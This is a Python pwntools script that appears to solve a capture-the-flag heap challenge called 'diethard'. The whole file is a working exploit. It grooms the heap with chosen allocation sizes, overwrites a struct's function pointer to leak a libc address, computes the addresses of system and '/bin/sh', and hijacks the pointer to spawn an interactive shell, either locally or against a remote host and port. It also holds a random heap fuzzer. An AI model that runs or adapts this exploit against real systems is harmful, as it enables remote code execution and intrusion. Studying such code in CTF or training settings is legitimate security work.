#!/usr/bin/env python

from pwn import *
import sys

'''
typedef struct msg_2017 {
	
	int msgLen;
	char* msgBuffer;
	func* print_buffer;
	int msg_id;
}

typedef struct msg_2016 + 0x21{
	
	int msgLen;
	char* msgBuffer = &msg_2016 + 0x20;
	func* print_buffer;
}

'''

def add(size, data):
	r.sendline('1')
	msg = r.recvuntil(':\n')
	if 'Cannot' in msg:
		return False
	r.sendline(str(size))
	r.recvuntil(':\n')
	r.sendline(data)
	r.recvuntil('\n\n')
	return True

def free(idx):
	r.sendline('2')
	r.recvuntil('?\n', timeout=1)
	r.sendline(str(idx))
	r.recvuntil('\n\n', timeout=1)

def exploit(r):
	r.recvuntil('\n\n')

	add(1574, "A"*1574)
	add(1499, "A"*1499)

	free(0)
	free(1)
	free(2)
	free(3)
	free(4)
	free(5)
	free(6)
	free(7)

	x = 0
	for i in [1573, 1558, 216, 803, 2027, 1832, 764]:
		if x == 4:
			payload  = "A" * 8
			payload += p64(8)
			payload += p64(0x603298)
			payload += p64(0x400976)
			add(i, payload)
			break
		else:
			add(i, chr(0x41+x)*i)
		x += 1

	r.sendline('2')
	r.recv(0x13)
	libc_base = u64(r.recv(8)) - 0x71ae0	#  0x76160
	bin_sh = libc_base + 0x1633e8			#  0x18c177
	libc_system = libc_base + 0x41490		#  0x45390

	log.info("libc_base  : " + hex(libc_base))
	log.info("libc_system: " + hex(libc_system))
	log.info("bin_sh     : " + hex(bin_sh))

	r.recvuntil('?\n')
	r.sendline('0')
	for i in range(1, 7):
		free(i)

	add(1574, "A"*1574)
	add(1499, "A"*1499)

	free(0)
	free(1)
	free(2)
	free(3)
	free(4)
	free(5)
	free(6)
	free(7)
	free(8)
	free(9)

	x = 0
	for i in [1573, 1558, 216, 803, 2027, 1832, 764][::-1]:
		if x == 2:
			payload  = "A" * 8
			payload += p64(0)
			payload += p64(bin_sh)
			payload += p64(libc_system)
			add(i, payload)
			break
		else:
			add(i, chr(0x41+x)*i)
		x += 1

	r.sendline('2')

	r.interactive()

global r

def fuzz():
	global r
	r = process(['./diethard'])
	while True:
		rounds = random.randrange(5000)
		for x in range(rounds):
			log.info("Round: %d" % x)
			sizes = []
			freed = []
			chunks = random.randrange(10)
			for chunk in range(chunks):
				size = random.randrange(2047)
				sizes.append(size)
				allocd = add(size, 'A'*size)
				if not allocd:
					break
			frees = random.randrange(10)
			for idx in range(frees):
				freed.append(idx)
				free(idx)
			open('fuzz.log', 'a').write("====== Round " + str(x) + " =====\n" +
										"chunks: " + str(chunks) + ", " + ', '.join(map(str, sizes))+'\n' + 
										"freed : " + ', '.join(map(str, freed)) +'\n')
	r.close()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
    	if sys.argv[1] == 'fuzz':
    		fuzz()
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./diethard'], env={"LD_PRELOAD":"./libc.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)